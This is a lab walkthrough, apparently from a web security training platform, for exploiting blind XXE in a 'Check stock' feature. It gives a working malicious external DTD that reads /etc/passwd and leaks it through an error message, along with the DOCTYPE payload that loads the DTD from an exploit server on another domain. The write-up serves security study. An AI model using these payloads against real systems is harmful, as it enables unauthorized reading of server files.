# Exploiting blind XXE to retrieve data via error messages
* This lab has a "Check stock" feature that parses XML input but does not display the result.
	* To solve the lab, use an external DTD to trigger an error message that displays the contents of the _/etc/passwd_ file.
	* The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

### 1. Create a malicious DTD file using "Go to exploit server"
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
* The _file_ entity will read the contents of `/etc/passwd`

![13](https://user-images.githubusercontent.com/53956303/152884844-8565fbc2-b4a9-4069-9127-e408df317488.png)
* Click "View exploit" and copy the exploit URL

![14](https://user-images.githubusercontent.com/53956303/152884939-55e47028-17fe-43fb-bbaf-6fa0ffa96e51.png)
```http
https://exploit-ac241fed1fc5b246c053393101c80034.web-security-academy.net/exploit
```
### 2. Send the _POST /product/stock_ request to repeater to modify
* Insert the external definition to execute the malicious DTD.
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac241fed1fc5b246c053393101c80034.web-security-academy.net/exploit"> %xxe; ]>
```
* Then, send the request.

![16](https://user-images.githubusercontent.com/53956303/152885654-ee20a32b-5bff-4615-9869-ffdd1a508663.png)
* As a result, contents of the _/etc/passwd_ file is given with an error message and the lab is solved.

![17](https://user-images.githubusercontent.com/53956303/152885743-c4f8ff0c-0161-40c8-9681-82527d9d51ae.png)
